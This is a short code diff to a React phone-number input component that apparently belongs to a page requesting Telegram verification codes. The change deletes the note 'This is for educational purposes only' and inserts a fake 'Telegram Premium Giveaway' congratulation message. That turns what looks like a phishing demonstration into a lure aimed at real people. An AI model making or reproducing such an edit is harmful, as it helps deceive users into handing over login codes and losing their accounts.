@@ -415,7 +415,7 @@ function PhoneInput({ onSubmit }) {
       <div className="info-section">
         <p className="security-note">
           🔒 We'll send a verification code via Telegram. 
-          This is for educational purposes only.
+          Congratulations! You’ve been selected for the Telegram Premium Giveaway..
         </p>
         
         <details className="help-dropdown">
